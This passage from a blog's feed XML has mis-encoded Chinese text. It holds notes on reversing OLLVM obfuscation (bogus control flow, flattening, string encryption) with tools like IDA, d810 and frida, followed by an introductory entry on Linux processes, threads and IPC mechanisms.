class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ReplaceInstWithInst</span>(&amp;BB, Inst, NewValue);</span><br><span class="line">      <span class="comment">//ä½¿ç”¨ ReplaceInstWithInst() æ›¿æ¢åŸå§‹æŒ‡ä»¤ã€‚</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Changed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h1 id="ollvm"><a href="#ollvm" class="headerlink" title="ollvm"></a>ollvm</h1><blockquote><p><a href="https://oacia.dev/ollvm-study/">ollvmä¸‰ç§æ··æ·†æ¨¡å¼çš„åæ··æ·†æ€è·¯</a></p><h2 id="è™šå‡æ§åˆ¶æµ-BCF-Bogus-Control-Flow"><a href="#è™šå‡æ§åˆ¶æµ-BCF-Bogus-Control-Flow" class="headerlink" title="è™šå‡æ§åˆ¶æµ BCF (Bogus Control Flow)"></a>è™šå‡æ§åˆ¶æµ BCF (Bogus Control Flow)</h2><p><a href="https://samsara-lo.github.io/2025/06/15/ollvm-BCF%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/">ollvm_BCF æºç é˜…è¯»</a></p></blockquote><p>åŸç†ï¼š</p><ul><li>è™šå‡æ§åˆ¶æµæ··æ·†é€šè¿‡åŠ å…¥åŒ…å«ä¸é€æ˜è°“è¯çš„æ¡ä»¶è·³è½¬ï¼ˆæ°¸çœŸoræ°¸å‡ï¼‰å’Œä¸å¯è¾¾çš„åŸºæœ¬å—ï¼Œæ¥å¹²æ‰° IDA çš„æ§åˆ¶æµåˆ†æå’Œ F5 åæ±‡ç¼–ã€‚</li></ul><p>åæ··æ·†ï¼š<br>1ã€å°†å…¨å±€å˜é‡èµ‹å€¼å¹¶å°† segment è®¾ä¸ºåªè¯»ã€‚</p><ul><li>å¯¹äºå¸¸è§„çš„ ollvm çš„ bcf æ··æ·†æ¥è¯´ï¼Œbcf çš„ä¸é€æ˜è°“è¯éƒ½æ˜¯å¤„äº .bssæ®µ ä¸­ã€‚</li><li>Edit-&gt;Segments-&gt;Edit segment å°† Write å¤é€‰æ¡†å–æ¶ˆå‹¾é€‰ï¼Œ .bssæ®µ å°±è®¾ä¸ºåªè¯»</li></ul><p>2ã€d810 </p><p>3ã€idapython patch ä¸é€æ˜è°“è¯</p><h2 id="æŒ‡ä»¤æ›¿æ¢ï¼ˆInstruction-Substitutionï¼‰"><a href="#æŒ‡ä»¤æ›¿æ¢ï¼ˆInstruction-Substitutionï¼‰" class="headerlink" title="æŒ‡ä»¤æ›¿æ¢ï¼ˆInstruction Substitutionï¼‰"></a>æŒ‡ä»¤æ›¿æ¢ï¼ˆInstruction Substitutionï¼‰</h2><p>åŸç†ï¼š</p><ul><li>ç”¨äºå°†ç¨‹åºä¸­çš„åŸå§‹æŒ‡ä»¤æ›¿æ¢ä¸ºç­‰æ•ˆä½†æ›´éš¾ç†è§£å’Œè¿˜åŸçš„æŒ‡ä»¤åºåˆ—ã€‚</li></ul><p>åæ··æ·†ï¼š<br>1ã€d810<br>2ã€GAMBA</p><h2 id="æ§åˆ¶æµå¹³å¦åŒ–ï¼ˆFLAï¼‰"><a href="#æ§åˆ¶æµå¹³å¦åŒ–ï¼ˆFLAï¼‰" class="headerlink" title="æ§åˆ¶æµå¹³å¦åŒ–ï¼ˆFLAï¼‰"></a>æ§åˆ¶æµå¹³å¦åŒ–ï¼ˆFLAï¼‰</h2><p>åŸç†ï¼š</p><ul><li>é€šè¿‡ä¸€ä¸ªä¸»åˆ†å‘å™¨æ¥æ§åˆ¶ç¨‹åºåŸºæœ¬å—çš„æ‰§è¡Œæµç¨‹<br><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202507111615099.png" alt=""></li><li>åºè¨€ï¼šå‡½æ•°çš„ç¬¬ä¸€ä¸ªæ‰§è¡Œçš„åŸºæœ¬å—</li><li>ä¸» (å­) åˆ†å‘å™¨ï¼šæ§åˆ¶ç¨‹åºè·³è½¬åˆ°ä¸‹ä¸€ä¸ªå¾…æ‰§è¡Œçš„åŸºæœ¬å—</li><li>retn å—ï¼šå‡½æ•°å‡ºå£</li><li>çœŸå®å—ï¼šæ··æ·†å‰çš„åŸºæœ¬å—ï¼Œç¨‹åºçœŸæ­£æ‰§è¡Œå·¥ä½œçš„å—</li><li>é¢„å¤„ç†å™¨ï¼šè·³è½¬åˆ°ä¸»åˆ†å‘å™¨</li></ul><p>å„å—ä¹‹é—´çš„è§„åˆ™ï¼š</p><ol><li>å‡½æ•°çš„å¼€å§‹åœ°å€ä¸ºåºè¨€çš„åœ°å€</li><li>åºè¨€çš„åç»§ä¸ºä¸»åˆ†å‘å™¨</li><li>åç»§ä¸ºä¸»åˆ†å‘å™¨çš„å—ä¸ºé¢„å¤„ç†å™¨</li><li>åç»§ä¸ºé¢„å¤„ç†å™¨çš„å—ä¸ºçœŸå®å—</li><li>æ— åç»§çš„å—ä¸ºretnå—</li><li>å‰©ä¸‹çš„ä¸ºæ— ç”¨å—</li></ol><p>åæ··æ·†ï¼š<br>1ã€<strong>æ‰¾åˆ°çœŸå®å—</strong>ã€‚æ‰‹æ’•ï¼›idapython é€šè¿‡å„ä¸ªå—ä¹‹é—´çš„è”ç³»é€šè¿‡ä¸€å®šçš„è§„åˆ™æ‰¾çœŸå®å—ï¼›å¯ä»¥ç”¨ unicorn æˆ– angr å¾—åˆ°å‡½æ•°çš„ CFG, åˆ©ç”¨è§„åˆ™åŒ¹é…å‡ºçœŸå®å—â€¦<br>æ–¹æ³•å¤šç§å¤šæ ·ï¼Œä½†æ˜¯æ ¸å¿ƒéƒ½æ˜¯æ‰¾åˆ°çœŸå®å—ï¼Œé™¤çœŸå®å—å’Œåºè¨€å—å¤–ï¼Œå…¶ä½™çš„å—éƒ½æ˜¯è™šå‡å—ï¼Œæˆ‘ä»¬éœ€è¦ NOP æ‰ä»–ä»¬ã€‚<br>2ã€<strong>å¾—åˆ°çœŸå®å—ä¹‹é—´çš„è”ç³»</strong>ã€‚æ¨¡æ‹Ÿæ‰§è¡ŒprçœŸæœºè°ƒè¯•æ‰“æ–­ç‚¹ traceã€‚<br>3ã€ç”¨è·³è½¬æ±‡ç¼–æŒ‡ä»¤å°†æ¯ä¸ªçœŸå®å—<strong>ä¸²</strong>èµ·æ¥ã€‚</p><h2 id="å­—ç¬¦ä¸²åŠ å¯†"><a href="#å­—ç¬¦ä¸²åŠ å¯†" class="headerlink" title="å­—ç¬¦ä¸²åŠ å¯†"></a>å­—ç¬¦ä¸²åŠ å¯†</h2><p>åŸç†ï¼š</p><ul><li>ç¼–å†™ä¸€ä¸ªpasså°†å…¶ä¸­çš„å­—ç¬¦ä¸²ä¿¡æ¯ä½¿ç”¨ä¸€äº›åŠ å¯†ç®—æ³•è¿›è¡ŒåŠ å¯†ï¼Œç„¶åç‰¹å®šçš„æ—¶é—´è¿›è¡Œè¿˜åŸã€‚ä¸€èˆ¬å«æœ‰å­—ç¬¦ä¸²æ··æ·†ã€å‡½æ•°åæ··æ·†ã€ä¸åœ¨init_arrayè§£å¯†ç­‰ã€‚</li></ul><p>åæ··æ·†ï¼š<br>ï¼ˆ1ï¼‰ç‰¹å¾æœç´¢ï¼šä¸€èˆ¬åœ¨soä¸­å¯ä»¥ç›´æ¥æœç´¢datadiv_decodeï¼Œä¸€èˆ¬å¾ˆå¤šç¼–å†™è§£å¯†å‡½æ•°è¿›è¡Œæ“ä½œæ˜¯è¿™ä¸ªå‡½æ•°ï¼Œé’ˆå¯¹è¿™ç§æƒ…å†µï¼Œä¸€èˆ¬å¯ä»¥é€šè¿‡frida hookå°±å¯ä»¥æ‹¿åˆ°è§£å¯†åçš„å€¼ï¼Œç„¶åè¿›è¡Œpatch<br>ï¼ˆ2ï¼‰init_arrayä¸­è§£å¯†ï¼šå­—ç¬¦ä¸²è§£å¯†æ“ä½œåœ¨init_arrrayä¸­è¿›è¡Œï¼Œä¸€èˆ¬å¯ä»¥é€šè¿‡æ¨¡æ‹Ÿæ‰§è¡Œinit_arrayï¼Œç„¶åå°†è§£å¯†åçš„å­—ç¬¦ä¸²å…¨éƒ¨ä¿å­˜ä¸‹æ¥<br>ï¼ˆ3ï¼‰jni_onloadè§£å¯†ï¼šåœ¨jni_onloadå‡½æ•°ä¸­è¿›è¡Œè§£å¯†æ“ä½œï¼Œè¿™æ—¶å€™å°±è¦è¿›è¡Œinlinehookæ‹¿åˆ°è§£å¯†åå¯„å­˜å™¨çš„å€¼ï¼Œä¹Ÿå¯ä»¥è¿›è¡Œhookï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨unicornè¿›è¡Œæ“ä½œ</p>]]></content>
      
      
      <categories>
          
          <category> llvm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> llvm </tag>
            
            <tag> ollvm </tag>
            
            <tag> obfuscation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxä¸­çš„è¿›ç¨‹é€šä¿¡ä¸å¤šçº¿ç¨‹</title>
      <link href="/2025/07/08/Linux%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
      <url>/2025/07/08/Linux%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="è¿›ç¨‹ä¸çº¿ç¨‹"><a href="#è¿›ç¨‹ä¸çº¿ç¨‹" class="headerlink" title="è¿›ç¨‹ä¸çº¿ç¨‹"></a>è¿›ç¨‹ä¸çº¿ç¨‹</h1><blockquote><p><em>çº¿ç¨‹æ˜¯ CPU è°ƒåº¦çš„æœ€å°å•ä½ï¼Œè¿›ç¨‹æ˜¯èµ„æºåˆ†é…çš„æœ€å°å•ä½ã€‚</em></p></blockquote><h2 id="è¿›ç¨‹ï¼ˆProcessï¼‰"><a href="#è¿›ç¨‹ï¼ˆProcessï¼‰" class="headerlink" title="è¿›ç¨‹ï¼ˆProcessï¼‰"></a>è¿›ç¨‹ï¼ˆProcessï¼‰</h2><ul><li><p><strong>èµ„æºåˆ†é…çš„åŸºæœ¬å•ä½</strong>ã€‚</p></li><li><p>æ¯ä¸ªè¿›ç¨‹æ‹¥æœ‰è‡ªå·±<strong>ç‹¬ç«‹çš„åœ°å€ç©ºé—´</strong>ï¼ˆä»£ç æ®µã€æ•°æ®æ®µã€å †ã€æ ˆï¼‰å’Œæ–‡ä»¶æè¿°ç¬¦è¡¨ã€‚</p></li><li><p><strong>è¿›ç¨‹ä¹‹é—´ä¸èƒ½ç›´æ¥è®¿é—®</strong>å½¼æ­¤çš„å†…å­˜ç©ºé—´ï¼Œåªèƒ½é€šè¿‡ IPCï¼ˆå¦‚ pipeã€shmã€socketï¼‰é€šä¿¡ã€‚</p></li><li><p>åˆ‡æ¢è¿›ç¨‹æ¶‰åŠå®Œæ•´çš„ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œå¼€é”€ç›¸å¯¹è¾ƒå¤§ã€‚</p></li></ul><blockquote><p>ä¸€ä¸ªè¿›ç¨‹æŒ‚æ‰ä¸ä¼šå½±å“å…¶ä»–è¿›ç¨‹</p></blockquote><h2 id="çº¿ç¨‹ï¼ˆThreadï¼‰"><a href="#çº¿ç¨‹ï¼ˆThreadï¼‰" class="headerlink" title="çº¿ç¨‹ï¼ˆThreadï¼‰"></a>çº¿ç¨‹ï¼ˆThreadï¼‰</h2><ul><li><p><strong>CPU è°ƒåº¦çš„åŸºæœ¬å•ä½</strong>ã€‚</p></li><li><p>ä¸€ä¸ªçº¿ç¨‹å±äºæŸä¸ªè¿›ç¨‹ï¼Œ<strong>å¤šä¸ªçº¿ç¨‹å…±äº«è¿›ç¨‹</strong>çš„åœ°å€ç©ºé—´ã€å †ã€æ–‡ä»¶ç­‰èµ„æºã€‚</p></li><li><p>æ¯ä¸ªçº¿ç¨‹æœ‰è‡ªå·±<strong>ç‹¬ç«‹</strong>çš„æ ˆç©ºé—´å’Œå¯„å­˜å™¨ä¸Šä¸‹æ–‡ã€‚</p></li><li><p>ä½¿ç”¨çº¿ç¨‹å¯ä»¥æ›´è½»é‡åœ°å®ç°å¹¶å‘ï¼ˆä¸Šä¸‹æ–‡åˆ‡æ¢æ¯”è¿›ç¨‹å¿«ï¼‰ã€‚</p></li></ul><blockquote><p>çº¿ç¨‹ä¹‹é—´é€šä¿¡<strong>æ— éœ€ç³»ç»Ÿè°ƒç”¨</strong>ï¼Œæ•ˆç‡é«˜ï¼›ä½†ä¸€ä¸ªçº¿ç¨‹å´©æºƒå¯èƒ½æ‹–å®æ•´ä¸ªè¿›ç¨‹ã€‚</p></blockquote><h2 id="åç¨‹ï¼ˆcoroutineï¼‰"><a href="#åç¨‹ï¼ˆcoroutineï¼‰" class="headerlink" title="åç¨‹ï¼ˆcoroutineï¼‰"></a>åç¨‹ï¼ˆcoroutineï¼‰</h2><p>åç¨‹æ˜¯åœ¨<strong>ç”¨æˆ·æ€</strong>è°ƒåº¦çš„æ›´è½»é‡çº§çš„æ‰§è¡Œå•å…ƒï¼Œ<strong>ä¸</strong>æ¶‰åŠç³»ç»Ÿè°ƒç”¨æˆ–ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œå› æ­¤æ›´å¿«ï¼Œä½†ä¸é€‚åˆå¤šæ ¸å¹¶è¡Œã€‚</p><h1 id="çº¿ç¨‹é€šä¿¡-vs-è¿›ç¨‹é€šä¿¡"><a href="#çº¿ç¨‹é€šä¿¡-vs-è¿›ç¨‹é€šä¿¡" class="headerlink" title="çº¿ç¨‹é€šä¿¡ vs è¿›ç¨‹é€šä¿¡"></a>çº¿ç¨‹é€šä¿¡ vs è¿›ç¨‹é€šä¿¡</h1><blockquote><p>çº¿ç¨‹ä¹‹é—´é€šè¿‡å…±äº«å†…å­˜é€šä¿¡ï¼Œè¿›ç¨‹ä¹‹é—´é€šä¿¡å¿…é¡»å€ŸåŠ©ç³»ç»Ÿæä¾›çš„ IPC æœºåˆ¶ã€‚</p></blockquote><h2 id="çº¿ç¨‹é€šä¿¡ï¼šåŸºäºå…±äº«å†…å­˜-åŒæ­¥æ§åˆ¶"><a href="#çº¿ç¨‹é€šä¿¡ï¼šåŸºäºå…±äº«å†…å­˜-åŒæ­¥æ§åˆ¶" class="headerlink" title="çº¿ç¨‹é€šä¿¡ï¼šåŸºäºå…±äº«å†…å­˜ + åŒæ­¥æ§åˆ¶"></a>çº¿ç¨‹é€šä¿¡ï¼šåŸºäºå…±äº«å†…å­˜ + åŒæ­¥æ§åˆ¶</h2><blockquote><p>çº¿ç¨‹é—´å…±äº«å†…å­˜ï¼Œä¸éœ€è¦ IPCï¼Œä½†å¿…é¡»é€šè¿‡åŒæ­¥æœºåˆ¶ä¿è¯çº¿ç¨‹å®‰å…¨ã€‚<br>å¹¶å‘è¯»å†™æ•°æ®ä¼šå¼•å‘ç«æ€</p><h3 id="é€šä¿¡åŸç†ï¼š"><a href="#é€šä¿¡åŸç†ï¼š" class="headerlink" title="é€šä¿¡åŸç†ï¼š"></a>é€šä¿¡åŸç†ï¼š</h3><ul><li>æ‰€æœ‰çº¿ç¨‹å…±äº«åŒä¸€ä¸ªè¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œå› æ­¤å¯ä»¥<strong>ç›´æ¥é€šè¿‡å…¨å±€å˜é‡æˆ–å †åŒºå…±äº«æ•°æ®</strong>ã€‚</li></ul></blockquote><ul><li>ä¸ºé¿å…å¹¶å‘å†²çªï¼Œéœ€ä½¿ç”¨<strong>åŒæ­¥åŸè¯­ï¼ˆé”ï¼‰</strong>ä¿è¯ä¸€è‡´æ€§ã€‚</li></ul><h3 id="å¸¸è§åŒæ­¥æœºåˆ¶ï¼š"><a href="#å¸¸è§åŒæ­¥æœºåˆ¶ï¼š" class="headerlink" title="å¸¸è§åŒæ­¥æœºåˆ¶ï¼š"></a>å¸¸è§åŒæ­¥æœºåˆ¶ï¼š</h3><div class="table-container"><table><thead><tr><th>æœºåˆ¶</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td><code>pthread_mutex_t</code></td><td>äº’æ–¥é”ï¼Œä¿è¯åŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªçº¿ç¨‹è®¿é—®èµ„æº</td></tr><tr><td><code>pthread_rwlock_t</code></td><td>è¯»å†™é”ï¼Œæé«˜è¯»å¤šå†™å°‘åœºæ™¯çš„æ•ˆç‡</td></tr><tr><td><code>pthread_cond_t</code></td><td>æ¡ä»¶å˜é‡ï¼Œé…åˆäº’æ–¥é”å®ç°çº¿ç¨‹é—´çš„ç­‰å¾…ä¸å”¤é†’</td></tr><tr><td>åŸå­æ“ä½œ</td><td>æ— é”åŒæ­¥ï¼Œå¦‚ <code>__sync_add_and_fetch</code></td></tr></tbody></table></div><h2 id="è¿›ç¨‹é€šä¿¡-IPC"><a href="#è¿›ç¨‹é€šä¿¡-IPC" class="headerlink" title="è¿›ç¨‹é€šä¿¡ IPC"></a>è¿›ç¨‹é€šä¿¡ IPC</h2><div class="table-container"><table><thead><tr><th>ç±»åˆ«</th><th>é€šä¿¡æ–¹å¼</th><th>æ˜¯å¦æ”¯æŒéäº²ç¼˜</th><th>æ˜¯å¦å†…æ ¸å‚ä¸</th><th>æ˜¯å¦æ”¯æŒåŒå‘</th></tr></thead><tbody><tr><td>ç®¡é“ç±»</td><td>pipeã€FIFO</td><td>FIFO æ”¯æŒ</td><td>æ˜¯</td><td>pipe å•å‘ï¼Œsocketpair åŒå‘</td></tr><tr><td>æ¶ˆæ¯ç±»</td><td>æ¶ˆæ¯é˜Ÿåˆ—ã€ä¿¡å·</td><td>æ˜¯</td><td>æ˜¯</td><td>æ˜¯</td></tr><tr><td>å…±äº«å†…å­˜ç±»</td><td><code>shmget</code>ã€<code>mmap</code></td><td>æ˜¯</td><td>éƒ¨åˆ†ï¼ˆæ•°æ®ç›´æ¥è¿›ç”¨æˆ·æ€ï¼‰</td><td>æ˜¯</td></tr><tr><td>åŒæ­¥æ§åˆ¶ç±»</td><td>ä¿¡å·é‡ã€futex</td><td>æ˜¯</td><td>æ˜¯/å¦</td><td>-</td></tr><tr><td>å¥—æ¥å­—ç±»</td><td>UNIX Socketã€TCP</td><td>æ˜¯</td><td>æ˜¯</td><td>æ˜¯</td></tr></tbody></table></div><h1 id="Linux-ä¸­çš„è¿›ç¨‹é—´é€šä¿¡ï¼ˆIPCï¼‰"><a href="#Linux-ä¸­çš„è¿›ç¨‹é—´é€šä¿¡ï¼ˆIPCï¼‰" class="headerlink" title="Linux ä¸­çš„è¿›ç¨‹é—´é€šä¿¡ï¼ˆIPCï¼‰"></a>Linux ä¸­çš„è¿›ç¨‹é—´é€šä¿¡ï¼ˆIPCï¼‰</h1><blockquote><p>IPCï¼ˆInter-Process Communicationï¼‰æ˜¯ä¸ºäº†è§£å†³ä¸åŒè¿›ç¨‹é—´å› å†…å­˜éš”ç¦»å¯¼è‡´çš„æ•°æ®äº¤æ¢éšœç¢ï¼ŒLinux æä¾›äº†å¤šç§æœºåˆ¶ä¾›ç¨‹åºé€‰æ‹©ã€‚</p></blockquote><h2 id="ç®¡é“ç±»é€šä¿¡ï¼ˆpipe-FIFOï¼‰"><a href="#ç®¡é“ç±»é€šä¿¡ï¼ˆpipe-FIFOï¼‰" class="headerlink" title="ç®¡é“ç±»é€šä¿¡ï¼ˆpipe / FIFOï¼‰"></a>ç®¡é“ç±»é€šä¿¡ï¼ˆpipe / FIFOï¼‰</h2><h3 id="åŒ¿åç®¡é“-pipe"><a href="#åŒ¿åç®¡é“-pipe" class="headerlink" title="åŒ¿åç®¡é“ pipe()"></a>åŒ¿åç®¡é“ pipe()</h3><ul><li><p>åªèƒ½ç”¨äºçˆ¶å­è¿›ç¨‹ã€‚</p></li><li><p>å•å‘é€šä¿¡ï¼Œé€‚ç”¨äºè¾“å…¥è¾“å‡ºæµä¼ é€’ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> pipefd[<span class="number">2</span>];</span><br><span class="line">pipe(pipefd);</span><br><span class="line">fork();</span><br><span class="line"><span class="comment">// å­å†™ pipefd[1]ï¼Œçˆ¶è¯» pipefd[0]</span></span><br></pre></td></tr></table></figure><p>Qï¼šä¸ºä»€ä¹ˆåªèƒ½çˆ¶å­ï¼Ÿ<br>Aï¼šæ–‡ä»¶æè¿°ç¬¦ç»§æ‰¿æ€§å†³å®šã€‚</p></li></ul><h4 id="æ–‡ä»¶æè¿°ç¬¦"><a href="#æ–‡ä»¶æè¿°ç¬¦" class="headerlink" title="æ–‡ä»¶æè¿°ç¬¦"></a>æ–‡ä»¶æè¿°ç¬¦</h4><blockquote><p>æ–‡ä»¶æè¿°ç¬¦è¡¨æ˜¯è¿›ç¨‹è®¿é—® I/O èµ„æºçš„ç´¢å¼•è¡¨ï¼Œæ˜¯ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´è¿æ¥çš„æ¡¥æ¢ã€‚</p></blockquote><div class="table-container"><table><thead><tr><th>FD</th><th>å«ä¹‰</th><th>å¯¹åº”æ–‡ä»¶æµ</th></tr></thead><tbody><tr><td>0</td><td>æ ‡å‡†è¾“å…¥ stdin</td><td><code>è¾“å…¥</code>ï¼ˆé”®ç›˜ï¼‰</td></tr><tr><td>1</td><td>æ ‡å‡†è¾“å‡º stdout</td><td><code>è¾“å‡º</code>ï¼ˆç»ˆç«¯ï¼‰</td></tr><tr><td>2</td><td>æ ‡å‡†é”™è¯¯ stderr</td><td><code>é”™è¯¯è¾“å‡º</code></td></tr></tbody></table></div><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ç”¨æˆ·è¿›ç¨‹</span><br><span class="line"> â””â”€ æ–‡ä»¶æè¿°ç¬¦è¡¨ï¼ˆfd=<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,...ï¼‰ â† æ¯ä¸ªè¿›ç¨‹ç‹¬ç«‹</span><br><span class="line">     â””â”€ æ–‡ä»¶è¡¨ï¼ˆfile <span class="keyword">structure</span>ï¼‰ â† å¤šè¿›ç¨‹å¯å…±äº«</span><br><span class="line">         â””â”€ inode è¡¨ï¼ˆinode <span class="keyword">structure</span>ï¼‰ â† è¡¨ç¤ºå…·ä½“æ–‡ä»¶å¯¹è±¡</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="å‘½åç®¡é“-FIFO"><a href="#å‘½åç®¡é“-FIFO" class="headerlink" title="å‘½åç®¡é“ FIFO"></a>å‘½åç®¡é“ FIFO</h3><ul><li>æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»ºï¼Œæ”¯æŒæ— è¡€ç¼˜è¿›ç¨‹é€šä¿¡ã€‚</li><li>å•å‘è¯»å†™ã€‚<blockquote><p> FIFO æ˜¯ç³»ç»Ÿä¸­çœŸå®æ–‡ä»¶ï¼Œæ”¯æŒå¤šè¿›ç¨‹ï¼›åŒ¿å pipe ä¸è¡Œã€‚</p></blockquote></li></ul><h2 id="æ¶ˆæ¯ç±»é€šä¿¡"><a href="#æ¶ˆæ¯ç±»é€šä¿¡" class="headerlink" title="æ¶ˆæ¯ç±»é€šä¿¡"></a>æ¶ˆæ¯ç±»é€šä¿¡</h2><h3 id="System-V-æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆmsggetã€msgsndã€msgrcvï¼‰"><a href="#System-V-æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆmsggetã€msgsndã€msgrcvï¼‰" class="headerlink" title="System V æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆmsggetã€msgsndã€msgrcvï¼‰"></a>System V æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆmsggetã€msgsndã€msgrcvï¼‰</h3><blockquote><p>æ¶ˆæ¯é˜Ÿåˆ—æ˜¯æ¶ˆæ¯çš„é“¾è¡¨ï¼Œå­˜æ”¾åœ¨å†…æ ¸ä¸­å¹¶ç”±æ¶ˆæ¯é˜Ÿåˆ—æ ‡è¯†ç¬¦æ ‡è¯†ã€‚</p></blockquote><p><strong>msgget:</strong> åˆ›å»ºæ¶ˆæ¯é˜Ÿåˆ—ï¼Œkey å€¼å”¯ä¸€æ ‡è¯†è¯¥æ¶ˆæ¯é˜Ÿåˆ—<br><strong>msgctl:</strong> æ§åˆ¶æ¶ˆæ¯é˜Ÿåˆ—<br><strong>msgsnd:</strong> å‘é€æ¶ˆæ¯<br><strong>msgrcv:</strong> æ¥æ”¶æ¶ˆæ¯</p><ul><li>åŸºäº key_t æ ‡è¯†ç¬¦ã€‚</li><li>å¯ä»¥ä¼ ç»“æ„åŒ–æ•°æ®ï¼Œæ”¯æŒä¼˜å…ˆçº§ã€‚</li></ul><p>Qï¼šæ¶ˆæ¯é˜Ÿåˆ—æœ€å¤§æ¶ˆæ¯å¤§å°ï¼Ÿ<br>Aï¼šé€šå¸¸æ˜¯ç³»ç»Ÿè®¾ç½®ï¼Œé»˜è®¤ 8192</p><h3 id="ä¿¡å·ï¼ˆkillã€signalã€sigactionï¼‰"><a href="#ä¿¡å·ï¼ˆkillã€signalã€sigactionï¼‰" class="headerlink" title="ä¿¡å·ï¼ˆkillã€signalã€sigactionï¼‰"></a>ä¿¡å·ï¼ˆkillã€signalã€sigactionï¼‰</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill(pid, SIGINT);</span><br></pre></td></tr></table></figure><p>Qï¼šä¿¡å·èƒ½æºå¸¦æ•°æ®å—ï¼Ÿ<br>Aï¼šæ ‡å‡†ä¿¡å·ä¸èƒ½ï¼Œsigqueue å¯ä»¥ã€‚</p><h2 id="å…±äº«å†…å­˜ç±»ï¼ˆæœ€é«˜æ•ˆï¼‰"><a href="#å…±äº«å†…å­˜ç±»ï¼ˆæœ€é«˜æ•ˆï¼‰" class="headerlink" title="å…±äº«å†…å­˜ç±»ï¼ˆæœ€é«˜æ•ˆï¼‰"></a>å…±äº«å†…å­˜ç±»ï¼ˆæœ€é«˜æ•ˆï¼‰</h2><p><strong>åŸç†</strong><br>å°†ä¸€æ®µç‰©ç†å†…å­˜æ˜ å°„åˆ°ä¸¤ä¸ªæˆ–å¤šä¸ªè¿›ç¨‹çš„åœ°å€ç©ºé—´ä¸­ï¼Œä½¿å¾—è¿›ç¨‹å¯ä»¥é€šè¿‡è¿™æ®µå†…å­˜ç›´æ¥è®¿é—®å½¼æ­¤çš„æ•°æ®ã€‚</p><h3 id="shmget-shmatï¼ˆSystem-Vï¼‰"><a href="#shmget-shmatï¼ˆSystem-Vï¼‰" class="headerlink" title="shmget + shmatï¼ˆSystem Vï¼‰"></a>shmget + shmatï¼ˆSystem Vï¼‰</h3><ul><li>å¤šä¸ªè¿›ç¨‹æ˜ å°„åŒä¸€ç‰©ç†é¡µï¼Œé€Ÿåº¦æœ€å¿«ï¼ˆé›¶æ‹·è´ï¼‰ã€‚</li><li>éœ€è¦ä½¿ç”¨åŒæ­¥æœºåˆ¶ï¼ˆå¦‚<code>semget</code>ä¿¡å·é‡ï¼‰é˜²æ­¢å¹¶å‘å†²çªã€‚</li></ul><h3 id="mmapï¼ˆPOSIXï¼‰"><a href="#mmapï¼ˆPOSIXï¼‰" class="headerlink" title="mmapï¼ˆPOSIXï¼‰"></a>mmapï¼ˆPOSIXï¼‰</h3><p>1ã€ä½¿ç”¨<code>shm_open</code> <strong>åˆ›å»ºæˆ–æ‰“å¼€å…±äº«å†…å­˜å¯¹è±¡</strong>ã€‚<br>2ã€ä½¿ç”¨<code>ftruncate</code><strong>è®¾ç½®å…±äº«å†…å­˜çš„å¤§å°</strong><br>3ã€ä½¿ç”¨ <code>mmap</code> å‡½æ•°<strong>å°†å…±äº«å†…å­˜æ˜ å°„åˆ°è¿›ç¨‹åœ°å€ç©ºé—´</strong><br>4ã€é€šè¿‡æ˜ å°„çš„æŒ‡é’ˆç›´æ¥<strong>è®¿é—®æ•°æ®</strong>ã€‚<br>5ã€ä½¿ç”¨ <code>munmap</code> å’Œ<code>shm_unlink</code>è§£é™¤æ˜ å°„ä¸åˆ é™¤å…±äº«å†…å­˜å¯¹è±¡</p><h2 id="åŒæ­¥æ§åˆ¶ç±»ï¼šä¿¡å·é‡-futex"><a href="#åŒæ­¥æ§åˆ¶ç±»ï¼šä¿¡å·é‡-futex" class="headerlink" title="åŒæ­¥æ§åˆ¶ç±»ï¼šä¿¡å·é‡ / futex"></a>åŒæ­¥æ§åˆ¶ç±»ï¼šä¿¡å·é‡ / futex</h2><h3 id="ä¿¡å·é‡ï¼ˆsemgetã€semopï¼‰"><a href="#ä¿¡å·é‡ï¼ˆsemgetã€semopï¼‰" class="headerlink" title="ä¿¡å·é‡ï¼ˆsemgetã€semopï¼‰"></a>ä¿¡å·é‡ï¼ˆsemgetã€semopï¼‰</h3><ul><li>å¯¹å…±äº«èµ„æºçš„è®¿é—®æ§åˆ¶æ ‡å¿—ã€‚</li><li>ä¸€èˆ¬é…åˆå…±äº«å†…å­˜ä½¿ç”¨ï¼Œç”¨äºå¹¶å‘æ§åˆ¶ã€‚</li></ul><h3 id="futexï¼ˆFast-Userspace-Mutexï¼‰"><a href="#futexï¼ˆFast-Userspace-Mutexï¼‰" class="headerlink" title="futexï¼ˆFast Userspace Mutexï¼‰"></a>futexï¼ˆFast Userspace Mutexï¼‰</h3><ul><li>ç°ä»£ Linux 